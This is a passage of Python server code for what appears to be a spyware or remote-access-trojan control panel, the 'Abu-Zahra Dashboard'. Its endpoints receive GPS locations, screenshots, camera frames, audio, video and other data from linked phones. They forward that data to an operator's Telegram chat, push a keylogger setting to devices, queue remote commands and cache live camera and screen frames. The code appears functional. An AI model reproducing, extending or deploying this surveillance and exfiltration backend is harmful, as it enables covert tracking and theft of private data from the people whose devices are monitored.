                    f"🆔 المعرف: <code>{cmd_id}</code>\n\n"
                    f"<code>{display_text}</code>"
                )
                if img_sent:
                    msg = f"{emoji} <b>{cmd_desc}</b>\n📱 <code>{dev_name}</code>\n\n<code>{display_text[:2000]}</code>"

                msg_sent = False
                if pending and pending.get("message_id"):
                    try:
                        edit_resp = await edit_message_text(
                            pending["chat_id"], pending["message_id"],
                            msg, reply_markup=None
                        )
                        if edit_resp and edit_resp.get("ok"):
                            msg_sent = True
                            log.info("API result EDITED pending message: cmd=%s msg_id=%d", cmd_id, pending["message_id"])
                    except Exception as edit_err:
                        log.warning("Edit pending message error for cmd=%s: %s", cmd_id, edit_err)

                if not msg_sent:
                    if batch_id and batch_id in _batch_operations:
                        _batch_operations[batch_id]["responded"] += 1
                        await update_batch_progress(batch_id)
                    else:
                        await send_admin(msg)
                elif batch_id and batch_id in _batch_operations:
                    _batch_operations[batch_id]["responded"] += 1
                    await update_batch_progress(batch_id)
                log.info("API result FORWARDED to Telegram: cmd=%s", cmd_id)
            except Exception as send_err:
                log.error("Failed to forward API result: %s", send_err)

        return web.json_response({"ok": True, "success": True, "message": "Result received"})
    except Exception as exc:
        log.error("command_result error: %s", exc)
        return web.json_response({"ok": False, "success": False, "error": str(exc)}, status=500)

async def api_heartbeat(request):
    """POST /api/heartbeat - Receive heartbeat from device."""
    global api_hits
    api_hits += 1
    try:
        body = await request.json()
        device_id = body.get("device_id", "")
        status_val = body.get("status", "online")
        battery = body.get("battery", 0)
        
        if not device_id:
            return web.json_response({"ok": False, "error": "device_id required"}, status=400)
        
        # Validate device token
        device_token = request.headers.get("X-Device-Token", "")
        if not get_device_by_token(device_id, device_token):
            return web.json_response({"ok": False, "error": "Unauthorized or device not found"}, status=401)
        
        is_online = status_val == "online"
        update_device(device_id, {
            "active": is_online,
            "battery": str(battery),
        })

        # === Real-time alert: online/offline transition ===
        was_online = _device_last_online_state.get(device_id, None)
        if was_online is not None and was_online != is_online:
            d = find_device(device_id)
            dev_name = d.get("name", device_id) if d else device_id
            if is_online:
                try:
                    await send_admin(
                        f"🟢 <b>الجهاز متصل</b>\n\n"
                        f"📱 {dev_name} (<code>{device_id}</code>)\n"
                        f"🔋 البطارية: {battery}%\n"
                        f"🕐 {ts()}",
                        disable_notification=True
                    )
                except Exception:
                    pass
            else:
                try:
                    await send_admin(
                        f"🔴 <b>الجهاز غير متصل</b>\n\n"
                        f"📱 {dev_name} (<code>{device_id}</code>)\n"
                        f"🕐 {ts()}",
                        disable_notification=True
                    )
                except Exception:
                    pass
            append_event(f"Device {'online' if is_online else 'offline'}", {"device_id": device_id, "battery": battery})
        _device_last_online_state[device_id] = is_online

        # === Real-time alert: low battery ===
        try:
            battery_int = int(battery)
            if 0 <= battery_int < LOW_BATTERY_THRESHOLD:
                last_alert_time = _device_last_battery_alert.get(device_id, 0)
                now = time.time()
                # Only alert once every 10 minutes per device
                if now - last_alert_time >= 600:
                    d = find_device(device_id)
                    dev_name = d.get("name", device_id) if d else device_id
                    try:
                        await send_admin(
                            f"⚠️ <b>بطارية منخفضة!</b>\n\n"
                            f"📱 {dev_name} (<code>{device_id}</code>)\n"
                            f"🔋 المستوى: <b>{battery_int}%</b>\n"
                            f"🕐 {ts()}",
                            disable_notification=True
                        )
                    except Exception:
                        pass
                    _device_last_battery_alert[device_id] = now
                    append_event("Low battery alert", {"device_id": device_id, "battery": battery_int})
        except (ValueError, TypeError):
            pass

        # Track IP for upload identification
        peer_ip = _get_real_ip(request)
        if peer_ip and peer_ip != "127.0.0.1":
            _ip_device_map[peer_ip] = device_id
        log.info("Heartbeat from %s: battery=%d%% status=%s ip=%s", device_id, battery, status_val, peer_ip)
        
        return web.json_response({"ok": True, "success": True, "message": "Heartbeat received"})
    except Exception as exc:
        log.error("heartbeat error: %s", exc)
        return web.json_response({"ok": True, "success": True})  # لا نريد فشل الـ heartbeat


async def api_device_data(request):
    """POST /api/data/{device_id} - Receive data from device."""
    global api_hits
    api_hits += 1
    device_id = request.match_info.get("device_id", "")
    log.info("Device data received from device_id=%s", device_id)
    try:
        body = await request.json()
        data_type = body.get("type", "")
        data = body.get("data", {})
        
        # Validate device token
        device_token = request.headers.get("X-Device-Token", "")
        d = get_device_by_token(device_id, device_token)
        if not d:
            return web.json_response({"ok": False, "error": "Unauthorized or device not found"}, status=401)
        
        dev_name = d.get("name", device_id)
        update_device(device_id, {"active": True})
        
        # Handle different data types
        if data_type == "location":
            lat = data.get("lat", "")
            lon = data.get("lon", "")
            update_device(device_id, {"location": f"{lat},{lon}"})
            loc_key = f"{device_id}:location"
            loc_now = time.time()
            if loc_now - _data_forward_dedup.get(loc_key, 0) >= 120:
                await send_admin(
                    f"📍 <b>Location Update</b>\n"
                    f"📱 {dev_name}\n"
                    f"🧭 <a href='https://maps.google.com/?q={lat},{lon}'>View Map</a>",
                    disable_notification=True
                )
                _data_forward_dedup[loc_key] = loc_now

        elif data_type == "battery":
            level = data.get("level", "?")
            update_device(device_id, {"battery": level})
            # Low battery alert from data endpoint
            try:
                level_int = int(level)
                if 0 <= level_int < LOW_BATTERY_THRESHOLD:
                    last_alert_time = _device_last_battery_alert.get(device_id, 0)
                    now_ts = time.time()
                    if now_ts - last_alert_time >= 600:
                        try:
                            await send_admin(
                                f"⚠️ <b>بطارية منخفضة!</b>\n\n"
                                f"📱 {dev_name} (<code>{device_id}</code>)\n"
                                f"🔋 المستوى: <b>{level_int}%</b>\n"
                                f"🕐 {ts()}",
                                disable_notification=True
                            )
                        except Exception:
                            pass
                        _device_last_battery_alert[device_id] = now_ts
            except (ValueError, TypeError):
                pass
        elif data_type == "screenshot" or data_type == "camera":
            img_data = data.get("image", "")
            if img_data and len(img_data) > 100:
                import base64
                try:
                    await send_photo(ADMIN_CHAT_ID, base64.b64decode(img_data),
                                     caption=f"📷 {data_type} from {dev_name}")
                except Exception:
                    await send_admin(f"📷 {data_type} from {dev_name}\n(Image data received)", disable_notification=True)
        else:
            # Generic data forward - with dedup
            fwd_key = f"{device_id}:{data_type}"
            fwd_now = time.time()
            if fwd_now - _data_forward_dedup.get(fwd_key, 0) < 120:
                log.info("Data dedup: skipped %s for %s", data_type, device_id)
                return web.json_response({"ok": True, "success": True, "message": "Data received (dedup)"})
            data_str = json.dumps(data, ensure_ascii=False)[:3000] if data else "Empty"
            await send_admin(
                f"📦 <b>Data Received</b>\n"
                f"📱 {dev_name}\n"
                f"📋 Type: <code>{data_type}</code>\n\n"
                f"<code>{data_str}</code>",
                disable_notification=True
            )
        
        append_event(f"Data received: {data_type}", {"device_id": device_id})
        
        return web.json_response({"ok": True, "success": True, "message": "Data received"})
    except Exception as exc:
        log.error("device_data error: %s", exc)
        return web.json_response({"ok": False, "success": False, "error": str(exc)}, status=500)


async def api_device_data_body(request):
    """POST /api/data - Receive data from device (body contains device_id).
    يدعم الشكل الذي يرسله التطبيق: {device_id, command, data, timestamp}
    Forwards data to Telegram admin."""
    global api_hits
    api_hits += 1
    try:
        body = await request.json()
        device_id = body.get("device_id", "")
        command = body.get("command", "")
        data = body.get("data", {})

        if not device_id:
            return web.json_response({"ok": False, "success": False, "error": "device_id required"}, status=400)

        # Validate device token
        device_token = request.headers.get("X-Device-Token", "")
        d = get_device_by_token(device_id, device_token)
        if not d:
            return web.json_response({"ok": False, "error": "Unauthorized or device not found"}, status=401)

        dev_name = d.get("name", device_id)
        update_device(device_id, {"active": True})
        append_event(f"Data received: {command}", {"device_id": device_id})

        # === ANTI-SPAM DEDUP: Prevent forwarding same data repeatedly ===
        body_dedup_key = f"{device_id}:{command}"
        body_dedup_now = time.time()
        body_dedup_entry = _data_body_dedup.get(body_dedup_key, {})
        body_data_str = json.dumps(data, ensure_ascii=False, sort_keys=True) if data else ""
        body_data_hash = hashlib.md5(body_data_str[:500].encode()).hexdigest() if body_data_str else ""
        
        # Skip if same device+command sent same data within 120 seconds
        last_body_time = body_dedup_entry.get("time", 0)
        last_body_hash = body_dedup_entry.get("hash", "")
        if body_data_hash and body_data_hash == last_body_hash and body_dedup_now - last_body_time < 120:
            log.info("Data body DEDUP BLOCKED: device=%s cmd=%s hash=%s", device_id, command, body_data_hash[:8])
            return web.json_response({"ok": True, "success": True, "message": "Data received (dedup)"})
        
        # Skip if more than 3 forwards for same device+command within 60 seconds
        # (handles cases where data changes slightly each time)
        body_dedup_entry.setdefault("recent_times", [])
        body_dedup_entry["recent_times"] = [t for t in body_dedup_entry["recent_times"] if body_dedup_now - t < 60]
        if len(body_dedup_entry["recent_times"]) >= 3:
            log.warning("Data body RATE BLOCKED: device=%s cmd=%s count=%d", device_id, command, len(body_dedup_entry["recent_times"]))
            return web.json_response({"ok": True, "success": True, "message": "Data received (rate limited)"})
        
        # Update dedup record
        _data_body_dedup[body_dedup_key] = {
            "time": body_dedup_now,
            "hash": body_data_hash,
            "recent_times": body_dedup_entry["recent_times"] + [body_dedup_now],
        }
        # Cleanup old entries
        expired = [k for k, v in _data_body_dedup.items() if body_dedup_now - v.get("time", 0) > 300]
        for k in expired:
            del _data_body_dedup[k]
        # Clean up old data_forward_dedup entries (older than 5 minutes)
        fwd_expired = [k for k, v in _data_forward_dedup.items() if body_dedup_now - v > 300]
        for k in fwd_expired:
            del _data_forward_dedup[k]

        # === FORWARD DATA TO TELEGRAM ===
        try:
            display_text = ""
            if isinstance(data, dict):
                if data.get("message"):
                    display_text = str(data["message"])
                elif data.get("data") is not None:
                    inner = data["data"]
                    if isinstance(inner, list):
                        count = len(inner)
                        if count == 0:
                            display_text = "لا توجد بيانات"
                        elif count <= 15:
                            display_text = f"تم بنجاح - {count} عنصر\n\n<code>{json.dumps(inner, ensure_ascii=False, indent=2)[:3000]}</code>"
                        else:
                            display_text = f"تم بنجاح - {count} عنصر (أول 10)\n\n<code>{json.dumps(inner[:10], ensure_ascii=False, indent=2)[:2000]}</code>\n\n...و {count-10} أخرى"
                    elif isinstance(inner, dict):
                        display_text = json.dumps(inner, ensure_ascii=False, indent=2)[:3000]
                    else:
                        display_text = str(inner)[:3000]
                elif data.get("ok"):
                    display_text = str(data.get("message", "تم بنجاح"))
                else:
                    display_text = json.dumps(data, ensure_ascii=False, indent=2)[:3000]
            elif isinstance(data, str):
                display_text = data[:3000]
            elif isinstance(data, list):
                count = len(data)
                if count <= 15:
                    display_text = f"{count} عنصر\n<code>{json.dumps(data, ensure_ascii=False, indent=2)[:3000]}</code>"
                else:
                    display_text = f"{count} عنصر (أول 10)\n<code>{json.dumps(data[:10], ensure_ascii=False, indent=2)[:2000]}</code>"
            else:
                display_text = str(data)[:3000]

            if not display_text:
                display_text = "تم الاستلام بنجاح"

            cmd_desc = command or "بيانات"
            for reg_name, reg_info in COMMAND_REGISTRY.items():
                if reg_info.get("cmd") == command:
                    cmd_desc = reg_info.get("desc", command)
                    break

            msg = (
                f"📦 <b>بيانات من الجهاز</b>\n\n"
                f"📱 الجهاز: <code>{dev_name}</code>\n"
                f"📋 النوع: {cmd_desc}\n\n"
                f"<code>{display_text}</code>"
            )
            await send_admin(msg)
        except Exception as fwd_err:
            log.error("Failed to forward body data to Telegram: %s", fwd_err)

        log.info("Data received (body) from %s: command=%s", device_id, command)
        return web.json_response({"ok": True, "success": True, "message": "Data received"})
    except Exception as exc:
        log.error("device_data_body error: %s", exc)
        return web.json_response({"ok": False, "success": False, "error": str(exc)}, status=500)

async def api_device_settings(request):
    """GET /api/settings/{device_id} - Get device settings."""
    global api_hits
    api_hits += 1
    device_id = request.match_info.get("device_id", "")
    d = find_device(device_id)
    if not d:
        return web.json_response({"ok": False, "error": "Device not found"}, status=404)
    
    settings = load_settings()
    return web.json_response({
        "ok": True,
        "settings": {
            "sync_interval": settings.get("sync_interval", 300),
            "location_interval": settings.get("location_interval", 60),
            "auto_location": settings.get("auto_location", True),
            "auto_sync": settings.get("auto_sync", True),
            "keylogger": settings.get("keylogger", False),
            "notifications": settings.get("notifications", True),
        }
    })


async def api_upload_file(request):
    """POST /api/upload - Receive files from device (photos, videos, audio, etc.).
    يرسل الملفات مباشرة للبوت تليجرام.
    Also caches screenshot/camera images for the JPEG streaming viewer."""
    global api_hits
    api_hits += 1
    try:
        # Parse multipart form data
        reader = await request.multipart()
        device_id = None
        file_type = "file"
        command_id = None
        caption = None
        file_data = None
        file_name = None
        file_size = 0
        upload_command = ""
        
        async for field in reader:
            if field.filename:
                # This is the file field
                file_name = field.filename
                file_data = await field.read()
                file_size = len(file_data)
            else:
                # Regular field
                value = await field.read()
                value_str = value.decode('utf-8') if value else ""
                if field.name == "device_id":
                    device_id = value_str
                elif field.name == "file_type":
                    file_type = value_str
                elif field.name == "command":
                    upload_command = value_str
                    # Use command as file_type hint if file_type not set
                    if value_str in ("screenshot", "camera", "photo"):
                        file_type = value_str
                elif field.name == "command_id":
                    command_id = value_str
                elif field.name == "caption":
                    caption = value_str
        
        if not file_data:
            return web.json_response({"ok": False, "error": "No file received"}, status=400)
        
        # If no device_id, try to identify by client IP
        if not device_id:
            peer_ip = _get_real_ip(request)
            if peer_ip and peer_ip in _ip_device_map:
                device_id = _ip_device_map[peer_ip]
                log.info("Upload: identified device %s by IP %s", device_id, peer_ip)
        
        # Still no device_id - accept but can't attribute
        if not device_id:
            device_id = "unknown"
            log.warning("Upload received without device_id and unknown IP %s", request.remote)
        
        # Validate device token (use IP-based lookup if no token header)
        device_token = request.headers.get("X-Device-Token", "")
        if device_token:
            d = get_device_by_token(device_id, device_token)
            if not d:
                return web.json_response({"ok": False, "error": "Unauthorized or device not found"}, status=401)
        else:
            # Fallback: IP-based identification already done above
            d = find_device(device_id) if device_id != "unknown" else None
        
        dev_name = (d.get("name", device_id) if d else device_id) if device_id != "unknown" else "Unknown"
        if device_id != "unknown":
            update_device(device_id, {"active": True})
        
        # === CACHE IMAGE FOR STREAMING VIEWER ===
        if file_type in ("screenshot", "camera", "photo") and device_id != "unknown" and len(file_data) > 1000:
            try:
                import base64 as b64mod
                frame_b64 = b64mod.b64encode(file_data).decode('ascii')
                frame_key = f"{device_id}:video"
                _latest_frames_module[frame_key] = {
                    "data": frame_b64,
                    "timestamp": time.time(),
                    "size": file_size,
                    "source": file_type,
                    "stream_id": device_id,
                    "is_keyframe": True,
                    "codec": "jpeg",
                }
                log.info("Cached %s frame for streaming: device=%s size=%d", file_type, device_id, file_size)
            except Exception as cache_err:
                log.error("Failed to cache frame: %s", cache_err)
        
        # Save file temporarily
        upload_dir = DATA_DIR / "uploads"
        upload_dir.mkdir(parents=True, exist_ok=True)
        
        safe_name = "".join(c if c.isalnum() or c in "._-" else "_" for c in (file_name or f"{file_type}_{int(time.time())}"))
        temp_path = upload_dir / f"{device_id}_{safe_name}"
        temp_path.write_bytes(file_data)
        
        log.info("File uploaded: %s (%d bytes) from device %s", file_name, file_size, device_id)
        append_event("File uploaded", {"device_id": device_id, "file": file_name, "type": file_type, "size": file_size})
        
        # Send to Telegram based on file type (skip if JPEG streaming to avoid spam)
        is_stream_frame = file_type in ("screenshot", "camera", "photo") and _jpeg_stream_info.get(device_id, {}).get("active", False)
        if not is_stream_frame:
            try:
                if file_type in ("photo", "screenshot", "camera"):
                    await tg_send_photo(ADMIN_CHAT_ID, temp_path, caption=f"📷 {file_type}\n📱 الجهاز: {dev_name}\n📁 {file_name}")
                elif file_type == "video":
                    await tg_send_video(ADMIN_CHAT_ID, temp_path, caption=f"🎬 فيديو\n📱 الجهاز: {dev_name}\n📁 {file_name}")
                elif file_type == "audio":
                    await tg_send_audio(ADMIN_CHAT_ID, temp_path, caption=f"🎙️ صوت\n📱 الجهاز: {dev_name}\n📁 {file_name}")
                else:
                    await tg_send_document(ADMIN_CHAT_ID, temp_path, caption=f"📄 ملف\n📱 الجهاز: {dev_name}\n📁 {file_name}")
                log.info("File sent to Telegram: %s", file_name)
            except Exception as tg_err:
                log.error("Failed to send file to Telegram: %s", tg_err)
        
        return web.json_response({
            "ok": True, 
            "success": True, 
            "message": "File uploaded successfully",
            "file_name": file_name,
            "file_size": file_size
        })
    except Exception as exc:
        log.error("upload_file error: %s", exc)
        return web.json_response({"ok": False, "success": False, "error": str(exc)}, status=500)


async def api_upload_base64(request):
    """POST /api/upload_base64 - Receive base64-encoded files from device.
    للصور الصغيرة ولقطات الشاشة."""
    global api_hits
    api_hits += 1
    try:
        body = await request.json()
        device_id = body.get("device_id", "")
        file_type = body.get("file_type", "photo")
        base64_data = body.get("base64_data", "")
        command_id = body.get("command_id")
        caption = body.get("caption")
        
        if not device_id:
            return web.json_response({"ok": False, "error": "device_id required"}, status=400)
        
        if not base64_data:
            return web.json_response({"ok": False, "error": "No base64 data provided"}, status=400)
        
        # Validate device token
        device_token = request.headers.get("X-Device-Token", "")
        d = get_device_by_token(device_id, device_token)
        if not d:
            return web.json_response({"ok": False, "error": "Unauthorized or device not found"}, status=401)
        
        dev_name = d.get("name", device_id)
        update_device(device_id, {"active": True})
        
        # Decode base64
        import base64
        try:
            # Remove data URL prefix if present
            if base64_data.startswith("data:"):
                base64_data = base64_data.split(",", 1)[1]
            file_bytes = base64.b64decode(base64_data)
        except Exception as decode_err:
            return web.json_response({"ok": False, "error": f"Invalid base64: {decode_err}"}, status=400)
        
        # Save file
        upload_dir = DATA_DIR / "uploads"
        upload_dir.mkdir(parents=True, exist_ok=True)
        
        ext = "png" if file_type in ("photo", "screenshot") else "jpg"
        file_name = f"{file_type}_{int(time.time())}.{ext}"
        temp_path = upload_dir / f"{device_id}_{file_name}"
        temp_path.write_bytes(file_bytes)
        
        log.info("Base64 file uploaded: %s (%d bytes) from device %s", file_name, len(file_bytes), device_id)
        append_event("Base64 file uploaded", {"device_id": device_id, "file": file_name, "type": file_type})
        
        # Send to Telegram
        try:
            caption_text = f"📷 {file_type}\n📱 الجهاز: {dev_name}"
            if caption:
                caption_text += f"\n{caption}"
            await tg_send_photo(ADMIN_CHAT_ID, temp_path, caption=caption_text)
            log.info("Base64 file sent to Telegram: %s", file_name)
        except Exception as tg_err:
            log.error("Failed to send base64 file to Telegram: %s", tg_err)
        
        return web.json_response({
            "ok": True, 
            "success": True, 
            "message": "File uploaded and sent to Telegram",
            "file_name": file_name
        })
    except Exception as exc:
        log.error("upload_base64 error: %s", exc)
        return web.json_response({"ok": False, "success": False, "error": str(exc)}, status=500)


async def tg_send_photo(chat_id, file_path, caption=None):
    """Send photo to Telegram."""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        with open(file_path, "rb") as f:
            data = aiohttp.FormData()
            data.add_field("chat_id", str(chat_id))
            data.add_field("photo", f, filename=file_path.name, content_type="image/jpeg")
            if caption:
                data.add_field("caption", caption[:1024])
                data.add_field("parse_mode", "HTML")
            
            session = get_tg_session()
            async with session.post(url, data=data, timeout=aiohttp.ClientTimeout(total=60)) as resp:
                if resp.status == 200:
                    return await resp.json()
                else:
                    error_text = await resp.text()
                    log.error("Failed to send photo: %s", error_text[:500])
                    return None
    except Exception as e:
        log.error("tg_send_photo error: %s", e)
        return None


async def tg_send_video(chat_id, file_path, caption=None):
    """Send video to Telegram."""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
        with open(file_path, "rb") as f:
            data = aiohttp.FormData()
            data.add_field("chat_id", str(chat_id))
            data.add_field("video", f, filename=file_path.name, content_type="video/mp4")
            if caption:
                data.add_field("caption", caption[:1024])
                data.add_field("parse_mode", "HTML")
            
            session = get_tg_session()
            async with session.post(url, data=data, timeout=aiohttp.ClientTimeout(total=120)) as resp:
                if resp.status == 200:
                    return await resp.json()
                else:
                    error_text = await resp.text()
                    log.error("Failed to send video: %s", error_text[:500])
                    return None
    except Exception as e:
        log.error("tg_send_video error: %s", e)
        return None


async def tg_send_audio(chat_id, file_path, caption=None):
    """Send audio to Telegram."""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendAudio"
        with open(file_path, "rb") as f:
            data = aiohttp.FormData()
            data.add_field("chat_id", str(chat_id))
            data.add_field("audio", f, filename=file_path.name, content_type="audio/mpeg")
            if caption:
                data.add_field("caption", caption[:1024])
                data.add_field("parse_mode", "HTML")
            
            session = get_tg_session()
            async with session.post(url, data=data, timeout=aiohttp.ClientTimeout(total=60)) as resp:
                if resp.status == 200:
                    return await resp.json()
                else:
                    error_text = await resp.text()
                    log.error("Failed to send audio: %s", error_text[:500])
                    return None
    except Exception as e:
        log.error("tg_send_audio error: %s", e)
        return None


async def tg_send_document(chat_id, file_path, caption=None):
    """Send document to Telegram."""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(file_path, "rb") as f:
            data = aiohttp.FormData()
            data.add_field("chat_id", str(chat_id))
            data.add_field("document", f, filename=file_path.name)
            if caption:
                data.add_field("caption", caption[:1024])
                data.add_field("parse_mode", "HTML")
            
            session = get_tg_session()
            async with session.post(url, data=data, timeout=aiohttp.ClientTimeout(total=60)) as resp:
                if resp.status == 200:
                    return await resp.json()
                else:
                    error_text = await resp.text()
                    log.error("Failed to send document: %s", error_text[:500])
                    return None
    except Exception as e:
        log.error("tg_send_document error: %s", e)
        return None


async def api_web_login(request):
    """POST /api/login - Web dashboard login."""
    global api_hits
    api_hits += 1
    try:
        body = await request.json()
        username = body.get("username", "admin")
        password = body.get("password", "")
        ip = request.remote or ""
        ua = request.headers.get("User-Agent", "")
        
        session = create_session(username, password, ip, ua)
        if not session:
            return web.json_response({"ok": False, "error": "Invalid credentials"}, status=401)
        
        return web.json_response({
            "ok": True,
            "token": session["token"],
            "expires_at": session["expires_at"],
        })
    except Exception as exc:
        return web.json_response({"ok": False, "error": str(exc)}, status=500)


async def api_web_logout(request):
    token = request.headers.get("Authorization", "").replace("Bearer ", "")
    if token:
        sessions = load_json(SESSIONS_FILE, [])
        sessions = [s for s in sessions if s.get("token") != token]
        save_json(SESSIONS_FILE, sessions)
    return web.json_response({"ok": True})


def require_auth(func):
    """Decorator to require valid session token."""
    async def wrapper(request, *args, **kwargs):
        global api_hits
        api_hits += 1
        auth = request.headers.get("Authorization", "")
        token = auth.replace("Bearer ", "") if auth.startswith("Bearer ") else ""
        if not token:
            return web.json_response({"ok": False, "error": "Unauthorized"}, status=401)
        session = validate_session(token)
        if not session:
            return web.json_response({"ok": False, "error": "Session expired"}, status=401)
        request["session"] = session
        return await func(request, *args, **kwargs)
    return wrapper


@require_auth
async def api_web_devices(request):
    devices = get_devices()
    return web.json_response({"ok": True, "devices": devices})


@require_auth
async def api_web_device_detail(request):
    device_id = request.match_info.get("device_id", "")
    d = find_device(device_id)
    if not d:
        return web.json_response({"ok": False, "error": "Not found"}, status=404)
    cmds = load_json(COMMANDS_FILE, [])
    device_cmds = [c for c in cmds if c.get("device_id") == device_id][-50:]
    return web.json_response({"ok": True, "device": d, "commands": device_cmds})


@require_auth
async def api_web_commands(request):
    commands = load_json(COMMANDS_FILE, [])
    return web.json_response({"ok": True, "commands": commands[-100:]})


@require_auth
async def api_web_events(request):
    events = load_json(EVENTS_FILE, [])
    return web.json_response({"ok": True, "events": events[-100:]})


@require_auth
async def api_web_stats(request):
    devices = get_devices()
    online = sum(1 for d in devices if d.get("active"))
    cmds = load_json(COMMANDS_FILE, [])
    pending = sum(1 for c in cmds if c.get("status") == "pending")
    completed = sum(1 for c in cmds if c.get("status") == "completed")
    events = load_json(EVENTS_FILE, [])
    return web.json_response({
        "ok": True,
        "stats": {
            "uptime": get_uptime(),
            "uptime_formatted": format_uptime(get_uptime()),
            "devices_total": len(devices),
            "devices_online": online,
            "commands_total": len(cmds),
            "commands_pending": pending,
            "commands_completed": completed,
            "messages_sent": messages_sent,
            "api_hits": api_hits,
            "events_total": len(events),
            "total_registered_commands": len(COMMAND_REGISTRY),
            "server_time": ts(),
            "port": SERVER_PORT,
            "domain": SERVER_DOMAIN,
        }
    })


@require_auth
async def api_web_send_command(request):
    try:
        body = await request.json()
        device_id = body.get("device_id", "")
        command = body.get("command", "")
        params = body.get("params", {})
        
        if not device_id or not command:
            return web.json_response({"ok": False, "error": "device_id and command required"}, status=400)
        
        d = find_device(device_id)
        if not d:
            return web.json_response({"ok": False, "error": "Device not found"}, status=404)
        
        cmd = queue_command(device_id, command, params)
        return web.json_response({"ok": True, "command": cmd})
    except Exception as exc:
        return web.json_response({"ok": False, "error": str(exc)}, status=500)


@require_auth
async def api_web_link_code(request):
    entry = await generate_link_code()
    return web.json_response({"ok": True, "code": entry["code"], "session_id": entry.get("session_id", "")})


@require_auth
async def api_web_settings_get(request):
    settings = load_settings()
    return web.json_response({"ok": True, "settings": settings})


@require_auth
async def api_web_settings_set(request):
    try:
        body = await request.json()
        settings = load_settings()
        for key, value in body.items():
            if key in settings:
                settings[key] = value
        save_settings_data(settings)
        return web.json_response({"ok": True})
    except Exception as exc:
        return web.json_response({"ok": False, "error": str(exc)}, status=500)


@require_auth
async def api_web_unlink(request):
    device_id = request.match_info.get("device_id", "")
    if remove_device(device_id):
        return web.json_response({"ok": True})
    return web.json_response({"ok": False, "error": "Not found"}, status=404)

# ============================================================================
# WEB DASHBOARD HTML
# ============================================================================

DASHBOARD_HTML = r"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Abu-Zahra Dashboard</title>
<style>
/* ========== CSS Custom Properties / Theme ========== */
:root {
  --bg: #0d1117;
  --bg-light: #161b22;
  --surface: #1c2128;
  --surface2: #21262d;
  --surface-hover: #292e36;
  --border: #30363d;
  --border-light: #484f58;
  --text: #e6edf3;
  --text-secondary: #8b949e;
  --text-muted: #656d76;
  --accent: #e63946;
  --accent-hover: #ff4d5a;
  --green: #3fb950;
  --green-bg: rgba(63,185,80,.12);
  --red: #f85149;
  --red-bg: rgba(248,81,73,.12);
  --yellow: #d29922;
  --yellow-bg: rgba(210,153,34,.12);
  --blue: #58a6ff;
  --blue-bg: rgba(88,166,255,.12);
  --purple: #bc8cff;
  --purple-bg: rgba(188,140,255,.12);
  --orange: #f0883e;
  --radius: 12px;
  --radius-sm: 8px;
  --radius-xs: 6px;
  --shadow: 0 1px 3px rgba(0,0,0,.3), 0 1px 2px rgba(0,0,0,.2);
  --shadow-lg: 0 10px 25px rgba(0,0,0,.4);
  --transition: .2s cubic-bezier(.4,0,.2,1);
  --sidebar-width: 260px;
  --topbar-height: 56px;
}
*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
html{-webkit-text-size-adjust:100%}
body{font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,Tahoma,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;line-height:1.5;-webkit-font-smoothing:antialiased}
::-webkit-scrollbar{width:6px;height:6px}
::-webkit-scrollbar-track{background:var(--bg)}
::-webkit-scrollbar-thumb{background:var(--border-light);border-radius:3px}
::-webkit-scrollbar-thumb:hover{background:var(--text-muted)}
input,select,textarea,button{font-family:inherit}
a{text-decoration:none;color:inherit}

/* ========== Login ========== */
.login-page{display:flex;align-items:center;justify-content:center;min-height:100vh;background:linear-gradient(135deg,var(--bg) 0%,#1a1a2e 50%,#16213e 100%);position:relative;overflow:hidden}
.login-page::before{content:'';position:absolute;width:600px;height:600px;border-radius:50%;background:radial-gradient(circle,rgba(230,57,70,.08),transparent 70%);top:-200px;right:-200px;pointer-events:none}
.login-box{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:40px 36px;width:380px;max-width:90vw;text-align:center;box-shadow:var(--shadow-lg);position:relative;z-index:1}
.login-box h1{color:var(--accent);margin-bottom:6px;font-size:26px;font-weight:700;letter-spacing:-.5px}
.login-box p{color:var(--text-secondary);margin-bottom:28px;font-size:14px}
.login-box input{width:100%;padding:12px 16px;border-radius:var(--radius-sm);border:1px solid var(--border);background:var(--bg);color:var(--text);font-size:15px;margin-bottom:12px;outline:none;transition:border var(--transition)}
.login-box input:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(230,57,70,.15)}
.login-box button{width:100%;padding:12px;border:none;border-radius:var(--radius-sm);background:var(--accent);color:#fff;font-size:16px;cursor:pointer;transition:background var(--transition);font-weight:600;margin-top:4px}
.login-box button:hover{background:var(--accent-hover);transform:translateY(-1px)}
.login-box button:active{transform:translateY(0)}
.login-error{color:var(--red);font-size:13px;margin-top:10px;display:none}

/* ========== App Layout ========== */
.app{display:none;min-height:100vh}

/* ========== Sidebar ========== */
.sidebar{position:fixed;top:0;right:0;width:var(--sidebar-width);height:100vh;background:var(--surface);border-left:1px solid var(--border);padding:0;z-index:100;transition:transform .3s cubic-bezier(.4,0,.2,1);display:flex;flex-direction:column;overflow-y:auto}
.sidebar .logo{padding:20px 20px 16px;border-bottom:1px solid var(--border);margin-bottom:8px;flex-shrink:0}
.sidebar .logo h2{color:var(--accent);font-size:18px;font-weight:700;display:flex;align-items:center;gap:8px}
.sidebar .logo span{color:var(--text-muted);font-size:11px;display:block;margin-top:2px}
.sidebar nav{flex:1;padding:4px 0}
.sidebar a{display:flex;align-items:center;padding:10px 20px;color:var(--text-secondary);cursor:pointer;font-size:14px;gap:10px;transition:all var(--transition);border-right:3px solid transparent;position:relative}
.sidebar a:hover{background:var(--surface2);color:var(--text)}
.sidebar a.active{background:var(--surface2);color:var(--accent);border-right-color:var(--accent);font-weight:600}
.sidebar a .nav-badge{margin-right:auto;background:var(--accent);color:#fff;font-size:10px;padding:1px 7px;border-radius:10px;font-weight:700;min-width:18px;text-align:center}
.sidebar .sidebar-footer{padding:12px 20px;border-top:1px solid var(--border);flex-shrink:0}
.sidebar-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:99;backdrop-filter:blur(2px)}

/* ========== Hamburger ========== */
